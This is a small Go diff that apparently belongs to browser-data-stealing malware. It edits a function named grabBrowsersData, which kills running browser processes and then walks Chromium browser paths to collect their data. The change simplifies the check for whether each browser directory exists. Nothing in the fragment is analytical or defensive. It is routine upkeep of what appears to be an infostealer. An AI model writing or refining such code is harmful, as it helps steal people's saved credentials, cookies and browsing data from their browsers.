@@ -240,8 +240,7 @@ func grabBrowsersData() {
 	_ = killBrowserProcesses()
 
 	for name, path := range ChromiumBrowserPaths {
-		stat, err := os.Stat(path)
-		if err != nil || !stat.IsDir() {
+		if _, err := os.Stat(path); os.IsNotExist(err) {
 			continue
 		}
 		grabChromiumData(path, name)
